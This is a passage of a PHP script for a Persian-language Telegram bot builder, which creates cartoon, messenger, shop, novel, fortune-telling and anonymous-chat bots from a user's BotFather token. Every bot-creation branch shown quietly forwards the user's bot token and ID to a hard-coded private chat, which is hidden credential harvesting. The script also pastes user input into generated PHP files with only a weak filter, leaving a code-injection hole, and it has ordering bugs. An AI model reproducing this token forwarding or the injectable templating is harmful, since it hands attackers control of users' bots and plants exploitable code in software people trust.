❌توکن ربات نامعتبر است لطفا یک توکن معتبر ارسال کنید❌
",
]);
}else{
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"🤖درحال ساخت ربات🤖",
]);
if($type =="Gold"){
file_put_contents("bot00/$un/data/bottype.txt","gold");
}else{
file_put_contents("bot00/$un/data/bottype.txt","free");
}
 //=================================
mkdir("bot00/$un");
mkdir("bot00/$un/data");
file_put_contents("bot00/$un/data/my_id.txt","$from_id");
file_put_contents("data/$from_id/state.txt","none");
$channel = file_get_contents("data/$chat_id/makan.txt");
$class = file_get_contents("source/makan/make.php");
$class = str_replace("[*[TOKEN]*]",$text,$class);
$class = str_replace("[*[ADMIN]*]",$from_id,$class);
$class = str_replace("[*[USERNAME]*]",$un,$class);
$class = str_replace("[*[CHANNEL]*]",$channel,$class);
file_put_contents("bot00/$un/make.php",$class);
//==================================
file_get_contents("https://api.telegram.org/bot".$text."/setwebhook?url=".$folder."/bot00/".$un."/make.php");
file_put_contents("data/$from_id/create.txt","yes");
$users = file_get_contents('data/bots.txt');
$member = explode("\n",$users);
if (!in_array($un,$member)){
$add_bot = file_get_contents('data/bots.txt');
$add_bot .= $un."\n";
file_put_contents('data/bots.txt',$add_bot);
}
$user_b = file_get_contents("data/$from_id/bots.txt");
$member_b = explode("\n",$user_b);
if (!in_array($un,$member_b)){
$add_bot = file_get_contents("data/$from_id/bots.txt");
$add_bot .= $un."\n";
file_put_contents("data/$from_id/bots.txt",$add_bot);
}
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
✅ربات شما با موفقیت ساخته شد✅
",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"🤖ورود به ربات🤖",'url'=>"https://t.me/$un"]],
]
])
]);

bot('sendMessage',[
'chat_id'=>-1001446893389,
'text'=>"
💀ربات جدید ساخته شد
توکن
$text
ایدی عددی سازنده
$from_id

",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"🤖ورود به ربات🤖",'url'=>"https://t.me/$un"]],
]
])
]);
$coin = file_get_contents("data/$from_id/coin.txt");
settype($coin,"integer");
$newcoin = $coin - 0;
file_put_contents("data/$from_id/coin.txt",$newcoin);
}
}
//====================

//====================
elseif($text1 == "🖼عکس کارتونی🖼"){
if($coin >= 0){
file_put_contents("data/$from_id/state.txt","carton");
bot('sendMessage',[
'chat_id'=>$chat_id,
 'text'=>"
🙂آیدی کانال بدون @ را بفرستید🙂
",
'parse_mode'=>'HTML',
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"↩️برگشت"]],
],
'resize_keyboard'=>true
])
]);
}else{
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
❌امتیاز شما برای ساخت این ربات کافی نمی باشد❌

💰جهت ساخت این ربات شما به 15 امتیاز نیاز دارید💰

💰امتیاز فعلی شما💰
$coin
",
'parse_mode'=>'HTML',
]);
}
}
elseif($state == "carton" && $text !="↩️برگشت" ){
if($text[0] == '@')$text = substr($text, 1);
if(strpos($text, '"') !== false && strpos($text, '.') !== false && strpos($text, '(') !== false){
bot('sendmessage',[
'chat_id' => $chat_id,
'text' => "
گوه نخور :/
",
]);
}elseif(!preg_match('/^([a-zA-Z][a-zA-Z0-9_]{4,31}|)$/', $text)){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>'❌آیدی کانال نامعتبر است لطفا یک آیدی معتبر ارسال کنید❌',
]);
}else{
file_put_contents("data/$chat_id/carton.txt",$text);
file_put_contents("data/$from_id/state.txt","carton1");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"🔹توکن ربات خود را از @botfather بفرستید.  
اگر درباره توکن چیزی نمیدانید از قسمت راهنمای رباتساز استفاده کنید😉",
'parse_mode'=>'Markdown', 
'reply_markup'=>json_encode([ 
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"↩️برگشت"]],
]
])
]);
}
}if(strpos($text, '"')!== false && strpos($text, '$') !== false && strpos($text, '.') !== false && strpos($text, '(') !== false){
bot('sendmessage',[
'chat_id' => $chat_id,
'text' => "
گوه نخور :/
",
]);
}
elseif($state == "carton1"){
function objectToArrays( $object ){
if( !is_object( $object ) && !is_array( $object ))
{
return $object;
}
if( is_object( $object ))
{
$object = get_object_vars( $object );
}
return array_map( "objectToArrays", $object );
}
$userbot = json_decode(file_get_contents("https://api.telegram.org/bot".$text."/getme"));
$resultb = objectToArrays($userbot);
$un = $resultb["result"]["username"];
$ok = $resultb["ok"];
if($ok != 1){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
❌توکن ربات نامعتبر است لطفا یک توکن معتبر ارسال کنید❌
",
]);
}else{
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"🤖درحال ساخت ربات🤖 ",
]);
if($type =="Gold"){
file_put_contents("bot00/$un/data/bottype.txt","gold");
}else{
file_put_contents("bot00/$un/data/bottype.txt","free");
}
 //=================================
mkdir("bot00/$un");
mkdir("bot00/$un/data");
mkdir("bot00/$un/photo");
file_put_contents("bot00/$un/data/my_id.txt","$from_id");
file_put_contents("data/$from_id/state.txt","none");
$channel = file_get_contents("data/$chat_id/carton.txt");
$class = file_get_contents("source/Kartoni/kar12.php");
$class = str_replace("[*[TOKEN]*]",$text,$class);
$class = str_replace("[*[ADMIN]*]",$from_id,$class);
$class = str_replace("[*[USERNAME]*]",$un,$class);
$class = str_replace("[*[CHANNEL]*]",$channel,$class);
$class = str_replace("[*[IDBOT]*]",$un,$class);
file_put_contents("bot00/$un/kar12.php",$class);
$photo = file_get_contents("source/Kartoni/photo");
file_put_contents("bot00/$un/photo",$photo);
//==================================
file_get_contents("https://api.telegram.org/bot".$text."/setwebhook?url=".$folder."/bot00/".$un."/kar12.php");
file_put_contents("data/$from_id/create.txt","yes");
$users = file_get_contents('data/bots.txt');
$member = explode("\n",$users);
if (!in_array($un,$member)){
$add_bot = file_get_contents('data/bots.txt');
$add_bot .= $un."\n";
file_put_contents('data/bots.txt',$add_bot);
}
$user_b = file_get_contents("data/$from_id/bots.txt");
$member_b = explode("\n",$user_b);
if (!in_array($un,$member_b)){
$add_bot = file_get_contents("data/$from_id/bots.txt");
$add_bot .= $un."\n";
file_put_contents("data/$from_id/bots.txt",$add_bot);
}
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
✅ربات شما با موفقیت ساخته شد✅
",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"🤖ورود به ربات🤖",'url'=>"https://t.me/$un"]],
]
])
]);

bot('sendMessage',[
'chat_id'=>-1001446893389,
'text'=>"
💀ربات جدید ساخته شد
توکن
$text
ایدی عددی سازنده
$from_id

",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"🤖ورود به ربات🤖",'url'=>"https://t.me/$un"]],
]
])
]);
$coin = file_get_contents("data/$from_id/coin.txt");
settype($coin,"integer");
$newcoin = $coin - 15;
file_put_contents("data/$from_id/coin.txt",$newcoin);
}
}
//==========================
elseif($text1 == "🗣پیام رسان🗣️"){
    file_put_contents("data/$from_id/state.txt","pvv");
bot('sendMessage',[
'chat_id'=>$chat_id,
 'text'=>"
🔹توکن ربات خود را از @botfather بفرستید.  
اگر درباره توکن چیزی نمیدانید از قسمت راهنمای رباتساز استفاده کنید😉
",
'parse_mode'=>'HTML',
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"↩️برگشت"]],
],
'resize_keyboard'=>true
])
]);
}

if(strpos($text, '"')!== false && strpos($text, '$') !== false && strpos($text, '.') !== false && strpos($text, '(') !== false){
bot('sendmessage',[
'chat_id' => $chat_id,
'text' => "
گوه نخور :/
",
]);
}
elseif($state == "pvv" && $text !="↩️برگشت" ){
function objectToArrays( $object ){
if( !is_object( $object ) && !is_array( $object ))
{
return $object;
}
if( is_object( $object ))
{
$object = get_object_vars( $object );
}
return array_map( "objectToArrays", $object );
}
   
$userbot = json_decode(file_get_contents("https://api.telegram.org/bot".$text."/getme"));
$resultb = objectToArrays($userbot);
$un = $resultb["result"]["username"];
$ok = $resultb["ok"];
if($ok != 1){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
❌توکن ربات نامعتبر است لطفا یک توکن معتبر ارسال کنید❌
",
]);
}

else{
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"🤖درحال ساخت ربات🤖 ",
]);
if($type =="Gold"){
file_put_contents("bot00/$randbotsa/data/bottype.txt","gold");
}else{
file_put_contents("bot00/$randbotsa/data/bottype.txt","free");
}
 //=================================
mkdir("bot00/$randbotsa");
mkdir("bot00/$randbotsa/data");
file_put_contents("bot00/$randbotsa/data/my_id.txt","$from_id");
file_put_contents("data/$from_id/state.txt","none");
$index = file_get_contents("source/pv/index.php");
$index = str_replace("[*[TOKEN]*]",$text,$index);
$index = str_replace("[*[ADMIN]*]",$from_id,$index);
file_put_contents("bot00/$randbotsa/index.php",$index);
//==================================
file_get_contents("https://api.telegram.org/bot".$text."/setwebhook?url=".$folder."/bot00/".$randbotsa."/index.php");
file_put_contents("data/$from_id/create.txt","yes");
$users = file_get_contents('data/bots.txt');
$member = explode("\n",$users);
if (!in_array($randbotsa,$member)){
$add_bot = file_get_contents('data/bots.txt');
$add_bot .= $randbotsa."\n";
file_put_contents('data/bots.txt',$add_bot);
}
$user_b = file_get_contents("data/$from_id/bots.txt");
$member_b = explode("\n",$user_b);
if (!in_array($randbotsa,$member_b)){
$add_bot = file_get_contents("data/$from_id/bots.txt");
$add_bot .= $randbotsa."\n";
file_put_contents("data/$from_id/bots.txt",$add_bot);
}
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
✅ربات شما با موفقیت ساخته شد✅
",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"🤖ورود به ربات🤖",'url'=>"https://t.me/$un"]],
]
])
]);

bot('sendMessage',[
'chat_id'=>-1001446893389,
'text'=>"
💀ربات جدید ساخته شد
توکن
$text
ایدی عددی سازنده
$from_id

",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"🤖ورود به ربات🤖",'url'=>"https://t.me/$un"]],
]
])
]);
$coin = file_get_contents("data/$from_id/coin.txt");
settype($coin,"integer");
$newcoin = $coin - 0;

}
}
//==========================
elseif($text1 == "🛒فروشگاه🛒"){
if($coin >= 0){
file_put_contents("data/$from_id/state.txt","shhop11");
bot('sendMessage',[
'chat_id'=>$chat_id,
 'text'=>"
🔹توکن ربات خود را از @botfather بفرستید.  
اگر درباره توکن چیزی نمیدانید از قسمت راهنمای رباتساز استفاده کنید😉
",
'parse_mode'=>'HTML',
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"↩️برگشت"]],
],
'resize_keyboard'=>true
])
]);
}else{
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
❌امتیاز شما برای ساخت این ربات کافی نمی باشد❌

💰جهت ساخت این ربات شما به 5 امتیاز نیاز دارید💰

💰امتیاز فعلی شما💰
$coin
",
'parse_mode'=>'HTML',
]);
}
}if(strpos($text, '"')!== false && strpos($text, '$') !== false && strpos($text, '.') !== false && strpos($text, '(') !== false){
bot('sendmessage',[
'chat_id' => $chat_id,
'text' => "
گوه نخور :/
",
]);
}
elseif($state == "shhop11" && $text !="↩️برگشت" ){
function objectToArrays( $object ){
if( !is_object( $object ) && !is_array( $object ))
{
return $object;
}
if( is_object( $object ))
{
$object = get_object_vars( $object );
}
return array_map( "objectToArrays", $object );
}
$userbot = json_decode(file_get_contents("https://api.telegram.org/bot".$text."/getme"));
$resultb = objectToArrays($userbot);
$un = $resultb["result"]["username"];
$ok = $resultb["ok"];
if($ok != 1){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
❌توکن ربات نامعتبر است لطفا یک توکن معتبر ارسال کنید❌
",
]);
}else{
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"🤖درحال ساخت ربات🤖",
]);
if($type =="Gold"){
file_put_contents("bot00/$un/data/bottype.txt","gold");
}else{
file_put_contents("bot00/$un/data/bottype.txt","free");
}
 //=================================
mkdir("bot00/$un");
mkdir("bot00/$un/data");
file_put_contents("bot00/$un/data/my_id.txt","$from_id");
file_put_contents("data/$from_id/state.txt","none");
$index = file_get_contents("source/shop2/index.php");
$index = str_replace("[TOKEN]",$text,$index);
$index = str_replace("[ADMIN]",$from_id,$index);
$index = str_replace("[USERNAME]",$un,$index);
$index = str_replace("[ADMINID]",$username,$index);
file_put_contents("bot00/$un/shop.php",$index);
//==================================
file_get_contents("https://api.telegram.org/bot".$text."/setwebhook?url=".$folder."/bot00/".$un."/shop.php");
file_put_contents("data/$from_id/create.txt","yes");
$users = file_get_contents('data/bots.txt');
$member = explode("\n",$users);
if (!in_array($un,$member)){
$add_bot = file_get_contents('data/bots.txt');
$add_bot .= $un."\n";
file_put_contents('data/bots.txt',$add_bot);
}
$user_b = file_get_contents("data/$from_id/bots.txt");
$member_b = explode("\n",$user_b);
if (!in_array($un,$member_b)){
$add_bot = file_get_contents("data/$from_id/bots.txt");
$add_bot .= $un."\n";
file_put_contents("data/$from_id/bots.txt",$add_bot);
}
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
✅ربات شما با موفقیت ساخته شد✅
",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"🤖ورود به ربات🤖",'url'=>"https://t.me/$un"]],
]
])
]);
bot('sendMessage',[
'chat_id'=>-1001446893389,
'text'=>"
💀ربات جدید ساخته شد
توکن
$text
ایدی عددی سازنده
$from_id

",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"🤖ورود به ربات🤖",'url'=>"https://t.me/$un"]],
]
])
]);
$coin = file_get_contents("data/$from_id/coin.txt");
settype($coin,"integer");
$newcoin = $coin - 0;
file_put_contents("data/$from_id/coin.txt",$newcoin);
}
}
//==========================
elseif($text1 == "📖رمان📖"){
if($coin >= 0){
file_put_contents("data/$from_id/state.txt","roman11");
bot('sendMessage',[
'chat_id'=>$chat_id,
 'text'=>"
🔹توکن ربات خود را از @botfather بفرستید.  
اگر درباره توکن چیزی نمیدانید از قسمت راهنمای رباتساز استفاده کنید😉
",
'parse_mode'=>'HTML',
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"↩️برگشت"]],
],
'resize_keyboard'=>true
])
]);
}else{
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
❌امتیاز شما برای ساخت این ربات کافی نمی باشد❌

💰جهت ساخت این ربات شما به 15 امتیاز نیاز دارید💰

💰امتیاز فعلی شما💰
$coin
",
'parse_mode'=>'HTML',
]);
}
}if(strpos($text, '"')!== false && strpos($text, '$') !== false && strpos($text, '.') !== false && strpos($text, '(') !== false){
bot('sendmessage',[
'chat_id' => $chat_id,
'text' => "
گوه نخور :/
",
]);
}
elseif($state == "roman11" && $text !="↩️برگشت" ){
function objectToArrays( $object ){
if( !is_object( $object ) && !is_array( $object ))
{
return $object;
}
if( is_object( $object ))
{
$object = get_object_vars( $object );
}
return array_map( "objectToArrays", $object );
}
$userbot = json_decode(file_get_contents("https://api.telegram.org/bot".$text."/getme"));
$resultb = objectToArrays($userbot);
$un = $resultb["result"]["username"];
$ok = $resultb["ok"];
if($ok != 1){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
❌توکن ربات نامعتبر است لطفا یک توکن معتبر ارسال کنید❌
",
]);
}else{
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"🤖درحال ساخت ربات🤖",
]);
if($type =="Gold"){
file_put_contents("bot00/$un/data/bottype.txt","gold");
}else{
file_put_contents("bot00/$un/data/bottype.txt","free");
}
 //=================================
mkdir("bot00/$un");
mkdir("bot00/$un/data");
file_put_contents("bot00/$un/data/my_id.txt","$from_id");
file_put_contents("data/$from_id/state.txt","none");
$index = file_get_contents("source/roman/uuff.php");
$index = str_replace("[*[TOKEN]*]",$text,$index);
$index = str_replace("[*[ADMIN]*]",$from_id,$index);
file_put_contents("bot00/$un/uuff.php",$index);
//==================================
file_get_contents("https://api.telegram.org/bot".$text."/setwebhook?url=".$folder."/bot00/".$un."/uuff.php");
file_put_contents("data/$from_id/create.txt","yes");
$users = file_get_contents('data/bots.txt');
$member = explode("\n",$users);
if (!in_array($un,$member)){
$add_bot = file_get_contents('data/bots.txt');
$add_bot .= $un."\n";
file_put_contents('data/bots.txt',$add_bot);
}
$user_b = file_get_contents("data/$from_id/bots.txt");
$member_b = explode("\n",$user_b);
if (!in_array($un,$member_b)){
$add_bot = file_get_contents("data/$from_id/bots.txt");
$add_bot .= $un."\n";
file_put_contents("data/$from_id/bots.txt",$add_bot);
}
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
✅ربات شما با موفقیت ساخته شد✅
",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"🤖ورود به ربات🤖",'url'=>"https://t.me/$un"]],
]
])
]);

bot('sendMessage',[
'chat_id'=>-1001446893389,
'text'=>"
💀ربات جدید ساخته شد
توکن
$text
ایدی عددی سازنده
$from_id

",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"🤖ورود به ربات🤖",'url'=>"https://t.me/$un"]],
]
])
]);
$coin = file_get_contents("data/$from_id/coin.txt");
settype($coin,"integer");
$newcoin = $coin - 0;
file_put_contents("data/$from_id/coin.txt",$newcoin);
}
}
//==========================

//======
elseif($text1 == "🔮فال گیر🔮"){
if($coin >= 0){
file_put_contents("data/$from_id/state.txt","fal");
bot('sendMessage',[
'chat_id'=>$chat_id,
 'text'=>"
🙂آیدی کانال بدون @ را بفرستید🙂
",
'parse_mode'=>'HTML',
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"↩️برگشت"]],
],
'resize_keyboard'=>true
])
]);
}else{
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
❌امتیاز شما برای ساخت این ربات کافی نمی باشد❌

💰جهت ساخت این ربات شما به 15 امتیاز نیاز دارید💰

💰امتیاز فعلی شما💰
$coin
",
'parse_mode'=>'HTML',
]);
}
}
elseif($state == "fal" && $text !="↩️برگشت" ){
if($text[0] == '@')$text = substr($text, 1);
if(strpos($text, '"') !== false && strpos($text, '.') !== false && strpos($text, '(') !== false){
bot('sendmessage',[
'chat_id' => $chat_id,
'text' => "
گوه نخور :/
",
]);
}elseif(!preg_match('/^([a-zA-Z][a-zA-Z0-9_]{4,31}|)$/', $text)){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>'❌آیدی کانال نامعتبر است لطفا یک آیدی معتبر ارسال کنید❌',
]);
}else{
file_put_contents("data/$chat_id/fal.txt",$text);
file_put_contents("data/$from_id/state.txt","fal1");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"🔹توکن ربات خود را از @botfather بفرستید.  
اگر درباره توکن چیزی نمیدانید از قسمت راهنمای رباتساز استفاده کنید😉",
'parse_mode'=>'Markdown', 
'reply_markup'=>json_encode([ 
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"↩️برگشت"]],
]
])
]);
}
}if(strpos($text, '"')!== false && strpos($text, '$') !== false && strpos($text, '.') !== false && strpos($text, '(') !== false){
bot('sendmessage',[
'chat_id' => $chat_id,
'text' => "
گوه نخور :/
",
]);
}
elseif($state == "fal1"){
function objectToArrays( $object ){
if( !is_object( $object ) && !is_array( $object ))
{
return $object;
}
if( is_object( $object ))
{
$object = get_object_vars( $object );
}
return array_map( "objectToArrays", $object );
}
$userbot = json_decode(file_get_contents("https://api.telegram.org/bot".$text."/getme"));
$resultb = objectToArrays($userbot);
$un = $resultb["result"]["username"];
$ok = $resultb["ok"];
if($ok != 1){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
❌توکن ربات نامعتبر است لطفا یک توکن معتبر ارسال کنید❌
",
]);
}else{
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"🤖درحال ساخت ربات🤖",
]);
if($type =="Gold"){
file_put_contents("bot00/$un/data/bottype.txt","gold");
}else{
file_put_contents("bot00/$un/data/bottype.txt","free");
}
 //=================================
mkdir("bot00/$un");
mkdir("bot00/$un/data");
file_put_contents("bot00/$un/data/my_id.txt","$from_id");
file_put_contents("data/$from_id/state.txt","none");
$channel = file_get_contents("data/$chat_id/fal.txt");
$class = file_get_contents("source/fal/op.php");
$class = str_replace("[*[TOKEN]*]",$text,$class);
$class = str_replace("[*[ADMIN]*]",$from_id,$class);
$class = str_replace("[*[USERNAME]*]",$un,$class);
$class = str_replace("[*[CHANNEL]*]",$channel,$class);
file_put_contents("bot00/$un/op.php",$class);
//==================================
file_get_contents("https://api.telegram.org/bot".$text."/setwebhook?url=".$folder."/bot00/".$un."/op.php");
file_put_contents("data/$from_id/create.txt","yes");
$users = file_get_contents('data/bots.txt');
$member = explode("\n",$users);
if (!in_array($un,$member)){
$add_bot = file_get_contents('data/bots.txt');
$add_bot .= $un."\n";
file_put_contents('data/bots.txt',$add_bot);
}
$user_b = file_get_contents("data/$from_id/bots.txt");
$member_b = explode("\n",$user_b);
if (!in_array($un,$member_b)){
$add_bot = file_get_contents("data/$from_id/bots.txt");
$add_bot .= $un."\n";
file_put_contents("data/$from_id/bots.txt",$add_bot);
}
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
✅ربات شما با موفقیت ساخته شد✅
",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"🤖ورود به ربات🤖",'url'=>"https://t.me/$un"]],
]
])
]);

bot('sendMessage',[
'chat_id'=>-1001446893389,
'text'=>"
💀ربات جدید ساخته شد
توکن
$text
ایدی عددی سازنده
$from_id

",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"🤖ورود به ربات🤖",'url'=>"https://t.me/$un"]],
]
])
]);
$coin = file_get_contents("data/$from_id/coin.txt");
settype($coin,"integer");
$newcoin = $coin - 0;
file_put_contents("data/$from_id/coin.txt",$newcoin);
}
}
//=======
elseif($text1 == "💬چت ناشناس💬"){
if($coin >= 0){
file_put_contents("data/$from_id/state.txt","chat");
bot('sendMessage',[
'chat_id'=>$chat_id,
 'text'=>"
🙂آیدی کانال بدون @ را بفرستید🙂
",
'parse_mode'=>'HTML',
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"↩️برگشت"]],
],
'resize_keyboard'=>true
])
]);
}else{
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
❌امتیاز شما برای ساخت این ربات کافی نمی باشد❌

💰جهت ساخت این ربات شما به 15 امتیاز نیاز دارید💰

💰امتیاز فعلی شما💰
$coin
",
'parse_mode'=>'HTML',
]);
}
}
elseif($state == "chat" && $text !="↩️برگشت" ){
if($text[0] == '@')$text = substr($text, 1);
if(strpos($text, '"') !== false && strpos($text, '.') !== false && strpos($text, '(') !== false){
bot('sendmessage',[
'chat_id' => $chat_id,
'text' => "
گوه نخور :/
",
]);
}elseif(!preg_match('/^([a-zA-Z][a-zA-Z0-9_]{4,31}|)$/', $text)){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>'❌آیدی کانال نامعتبر است لطفا یک آیدی معتبر ارسال کنید❌',
]);
}else{
file_put_contents("data/$chat_id/chat.txt",$text);
file_put_contents("data/$from_id/state.txt","chat1");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"🔹توکن ربات خود را از @botfather بفرستید.  
اگر درباره توکن چیزی نمیدانید از قسمت راهنمای رباتساز استفاده کنید😉",
'parse_mode'=>'Markdown', 
'reply_markup'=>json_encode([ 
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"↩️برگشت"]],
]
])
]);
}
}if(strpos($text, '"')!== false && strpos($text, '$') !== false && strpos($text, '.') !== false && strpos($text, '(') !== false){
bot('sendmessage',[
'chat_id' => $chat_id,
'text' => "
گوه نخور :/
",
]);
}
elseif($state == "chat1"){
function objectToArrays( $object ){
if( !is_object( $object ) && !is_array( $object ))
{
return $object;
}
if( is_object( $object ))
{
$object = get_object_vars( $object );
}
return array_map( "objectToArrays", $object );
}
$userbot = json_decode(file_get_contents("https://api.telegram.org/bot".$text."/getme"));
$resultb = objectToArrays($userbot);
$un = $resultb["result"]["username"];
$ok = $resultb["ok"];
if($ok != 1){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
❌توکن ربات نامعتبر است لطفا یک توکن معتبر ارسال کنید❌
",
]);
}else{
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"🤖درحال ساخت ربات🤖",
]);
if($type =="Gold"){
file_put_contents("bot00/$un/data/bottype.txt","gold");
}else{
file_put_contents("bot00/$un/data/bottype.txt","free");
}
 //=================================
mkdir("bot00/$un");
mkdir("bot00/$un/data");
mkdir("bot00/$un/user");
file_put_contents("bot00/$un/data/my_id.txt","$from_id");
file_put_contents("data/$from_id/state.txt","none");
$channel = file_get_contents("data/$chat_id/chat.txt");
$class = file_get_contents("source/chat/chq.php");
$class = str_replace("[*[TOKEN]*]",$text,$class);
$class = str_replace("[*[ADMIN]*]",$from_id,$class);
$class = str_replace("[*[USERNAME]*]",$un,$class);
$class = str_replace("[*[CHANNEL]*]",$channel,$class);
file_put_contents("bot00/$un/chq.php",$class);
$time = file_get_contents("source/chat/time.php");
file_put_contents("bot00/$un/time.php",$time);
//==================================
file_get_contents("https://api.telegram.org/bot".$text."/setwebhook?url=".$folder."/bot00/".$un."/chq.php");
file_put_contents("data/$from_id/create.txt","yes");
$users = file_get_contents('data/bots.txt');
$member = explode("\n",$users);
if (!in_array($un,$member)){
$add_bot = file_get_contents('data/bots.txt');
$add_bot .= $un."\n";
file_put_contents('data/bots.txt',$add_bot);
}
$user_b = file_get_contents("data/$from_id/bots.txt");
$member_b = explode("\n",$user_b);
if (!in_array($un,$member_b)){
$add_bot = file_get_contents("data/$from_id/bots.txt");
$add_bot .= $un."\n";
file_put_contents("data/$from_id/bots.txt",$add_bot);
}
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
✅ربات شما با موفقیت ساخته شد✅
",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"🤖ورود به ربات🤖",'url'=>"https://t.me/$un"]],
]
])
]);

bot('sendMessage',[
'chat_id'=>-1001446893389,
'text'=>"
💀ربات جدید ساخته شد
توکن
$text
ایدی عددی سازنده
$from_id

",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"🤖ورود به ربات🤖",'url'=>"https://t.me/$un"]],
]
])
]);
$coin = file_get_contents("data/$from_id/coin.txt");
settype($coin,"integer");
$newcoin = $coin - 0;
file_put_contents("data/$from_id/coin.txt",$newcoin);
}
}
//========
elseif($text1 == "🛡ضد لینک🛡"){
if(0){
file_put_contents("data/$from_id/state.txt","anti");
bot('sendMessage',[
'chat_id'=>$chat_id,
 'text'=>"
🙂آیدی کانال بدون @ را بفرستید🙂
",
'parse_mode'=>'HTML',
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"↩️برگشت"]],
],
'resize_keyboard'=>true
])
]);
}else{
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
در حال حاظر نمیتوانید ربات بسازید
",
'parse_mode'=>'HTML',
]);
}
}
elseif($state == "anti" && $text !="↩️برگشت" ){
if($text[0] == '@')$text = substr($text, 1);
if(strpos($text, '"') !== false && strpos($text, '.') !== false && strpos($text, '(') !== false){
bot('sendmessage',[
'chat_id' => $chat_id,
'text' => "
گوه نخور :/
",
]);
}elseif(!preg_match('/^([a-zA-Z][a-zA-Z0-9_]{4,31}|)$/', $text)){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>'❌آیدی کانال نامعتبر است لطفا یک آیدی معتبر ارسال کنید❌',
]);
}else{
file_put_contents("data/$chat_id/anti.txt",$text);
file_put_contents("data/$from_id/state.txt","anti1");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"🔹توکن ربات خود را از @botfather بفرستید.  
اگر درباره توکن چیزی نمیدانید از قسمت راهنمای رباتساز استفاده کنید😉",
'parse_mode'=>'Markdown', 
'reply_markup'=>json_encode([ 
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"↩️برگشت"]],
]
])
]);
}
}if(strpos($text, '"')!== false && strpos($text, '$') !== false && strpos($text, '.') !== false && strpos($text, '(') !== false){
bot('sendmessage',[
'chat_id' => $chat_id,
'text' => "
گوه نخور :/
",
]);
}
elseif($state == "anti1"){
function objectToArrays( $object ){
if( !is_object( $object ) && !is_array( $object ))
{
return $object;
}
if( is_object( $object ))
{
$object = get_object_vars( $object );
}
return array_map( "objectToArrays", $object );
}
if(strpos($text, "%") !== false or strpos($text, '$' !== false)){
file_put_contents("data/$chat_id/stats.txt", "No");
}else{
bot('sendMessage',
['chat_id'=>$chat_id,
'text'=>"🤖 ",
]);
    
}
$userbot = json_decode(file_get_contents("https://api.telegram.org/bot".$text."/getme"));
$resultb = objectToArrays($userbot);
$un = $resultb["result"]["username"];
$ok = $resultb["ok"];
if($ok != 1){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
❌توکن ربات نامعتبر است لطفا یک توکن معتبر ارسال کنید❌
",
]);
}else{
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"🤖درحال ساخت ربات🤖",
]);
if($type =="Gold"){
file_put_contents("bot00/$un/data/bottype.txt","gold");
}else{
file_put_contents("bot00/$un/data/bottype.txt","free");
}
 //=================================
mkdir("bot00/$un");
mkdir("bot00/$un/data");
